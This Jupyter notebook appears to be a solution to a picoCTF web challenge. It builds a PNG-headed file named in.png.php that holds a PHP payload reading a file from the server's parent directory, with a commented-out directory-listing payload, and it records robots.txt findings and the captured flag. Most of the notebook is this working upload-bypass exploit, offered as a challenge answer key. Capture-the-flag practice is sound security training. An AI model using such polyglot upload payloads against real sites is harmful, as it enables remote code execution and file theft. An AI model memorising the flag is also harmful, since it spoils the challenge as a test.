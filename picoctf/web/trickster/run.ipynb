{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwnlib.util import packing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "pwn = open(\"in.png.php\", \"wb+\")\n",
    "pwn.write(bytes([137, 80, 78,71,13,10,26,10]))\n",
    "# pwn.write(b\"<?php print_r(scandir('./../'));  ?>\")\n",
    "pwn.write(b\"<?php echo file_get_contents( \\\"./../GNTDOMBWGIZDE.txt\\\" );  ?>\")\n",
    "pwn.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Robots.txt\n",
    "- Disallow: /instructions.txt\n",
    "- Disallow: /uploads/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "found GNTDOMBWGIZDE.txt in subdir \\\n",
    "picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222} \\"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
